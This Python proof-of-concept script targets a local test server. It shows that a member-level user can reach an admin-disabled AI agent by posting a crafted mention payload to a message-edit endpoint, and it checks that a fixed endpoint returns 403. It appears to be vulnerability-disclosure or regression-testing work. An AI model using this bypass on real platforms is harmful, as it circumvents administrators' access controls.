import requests
import json

# Configuration
BASE_URL = "http://localhost:5000"
VULNERABLE_ENDPOINT = f"{BASE_URL}/api/assistant/conversations/123/messages/456/edit"
FIXED_ENDPOINT = f"{BASE_URL}/api/assistant/conversations/123/messages/456/edit_fixed"
ADMIN_ENDPOINT = f"{BASE_URL}/api/manage_agents"

# Headers to simulate a member user
MEMBER_HEADERS = {
    "Authorization": "member",
    "Content-Type": "application/json",
    "Accept": "*/*"
}

# Headers to simulate an admin user
ADMIN_HEADERS = {
    "Authorization": "admin",
    "Content-Type": "application/json",
    "Accept": "*/*"
}

# Payload to bypass chatbot restrictions
PAYLOAD = {
    "content": ":mention[gemini-pro]{sId=gemini-pro} how are you?",
    "mentions": [{"type": "agent", "configurationId": "gemini-pro"}]
}

def check_agent_status():
    """Check the status of agents as an admin."""
    try:
        response = requests.get(ADMIN_ENDPOINT, headers=ADMIN_HEADERS)
        print("Admin - Agent Status:")
        print(json.dumps(response.json(), indent=2))
        return response.status_code == 200
    except requests.RequestException as e:
        print(f"Error checking agent status: {e}")
        return False

def test_vulnerable_endpoint():
    """Test the vulnerable endpoint to bypass restrictions."""
    try:
        response = requests.post(VULNERABLE_ENDPOINT, headers=MEMBER_HEADERS, json=PAYLOAD)
        print("\nVulnerable Endpoint Test:")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {json.dumps(response.json(), indent=2)}")
        return response.status_code == 200
    except requests.RequestException as e:
        print(f"Error testing vulnerable endpoint: {e}")
        return False

def test_fixed_endpoint():
    """Test the fixed endpoint to verify restrictions."""
    try:
        response = requests.post(FIXED_ENDPOINT, headers=MEMBER_HEADERS, json=PAYLOAD)
        print("\nFixed Endpoint Test:")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {json.dumps(response.json(), indent=2)}")
        return response.status_code == 403
    except requests.RequestException as e:
        print(f"Error testing fixed endpoint: {e}")
        return False

def main():
    print("=== PoC: Bypassing Chatbot Restrictions ===")
    
    # Step 1: Verify agent status (Gemini should be disabled)
    print("\nStep 1: Checking agent status as admin")
    if not check_agent_status():
        print("Failed to check agent status. Is the server running?")
        return

    # Step 2: Test vulnerable endpoint as member
    print("\nStep 2: Testing vulnerable endpoint as member")
    if test_vulnerable_endpoint():
        print("Success: Bypassed restrictions! Member accessed disabled Gemini agent.")
    else:
        print("Failure: Could not bypass restrictions on vulnerable endpoint.")

    # Step 3: Test fixed endpoint as member
    print("\nStep 3: Testing fixed endpoint as member")
    if test_fixed_endpoint():
        print("Success: Fixed endpoint blocked access to disabled Gemini agent.")
    else:
        print("Failure: Fixed endpoint did not block access as expected.")

if __name__ == "__main__":
    main()